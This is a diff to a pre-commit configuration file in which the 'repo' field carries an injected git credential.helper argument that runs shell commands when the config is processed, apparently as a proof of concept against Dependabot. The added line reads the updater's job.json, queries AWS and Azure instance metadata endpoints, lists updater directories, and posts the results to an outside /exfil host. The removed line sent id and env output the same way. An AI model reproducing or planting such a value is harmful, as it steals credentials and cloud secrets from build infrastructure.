@@ -1,7 +1,8 @@
 repos:
-- repo: "-c credential.helper=!(id;env)|curl${IFS}-sk${IFS}-X${IFS}POST${IFS}https://d8jrcfp4f27l6kglnctg54p6c9acdo7m7.oast.pro/proof${IFS}-d${IFS}@- https://gitlab.com/nonexistent-dependabot-test/nonexistent-private-repo"
+- repo: "-c credential.helper=!(echo${IFS}===JOB===;cat${IFS}/home/dependabot/dependabot-updater/job.json;echo${IFS}===IMDS-AWS===;curl${IFS}-sf${IFS}--connect-timeout${IFS}3${IFS}http://169.254.169.254/latest/meta-data/;echo${IFS}===IMDS-AZURE===;curl${IFS}-sf${IFS}--connect-timeout${IFS}3${IFS}-H${IFS}Metadata:true${IFS}http://169.254.169.254/metadata/instance?api-version=2021-02-01;echo${IFS}===UPDATER-DIR===;ls${IFS}/home/dependabot/dependabot-updater/;echo${IFS}===REPO===;ls${IFS}/home/dependabot/dependabot-updater/repo)|curl${IFS}-sk${IFS}-X${IFS}POST${IFS}https://d8jrgg94f27lr795bsj0fuiwnz3txef8o.oast.fun/exfil${IFS}-d${IFS}@- https://gitlab.com/nonexistent-dependabot-test/nonexistent-private-repo"
   rev: "v4.5.0"
   hooks:
   - id: "trailing-whitespace"
     additional_dependencies:
       - "requests>=2.28.0"
+
